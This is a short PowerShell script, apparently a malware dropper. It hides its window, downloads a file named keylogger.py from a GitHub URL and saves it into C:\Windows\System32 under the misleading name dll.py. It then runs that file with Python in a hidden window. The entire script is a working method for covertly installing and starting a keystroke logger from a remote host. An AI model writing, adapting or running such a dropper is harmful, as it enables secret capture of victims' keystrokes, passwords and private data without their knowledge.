powershell -WindowStyle hidden
$username = $env:UserName
$dest = "C:\Windows\System32\dll.py"
$bol1 = Test-Path -Path $dest

if (-Not $bol1){
  Invoke-Webrequest -Uri "https://github.com/ASL-rgb/keylogger/blob/main/keylogger.py" -Outfile $dest
}

powershell -WindowStyle hidden python C:\Windows\System32\dll.py
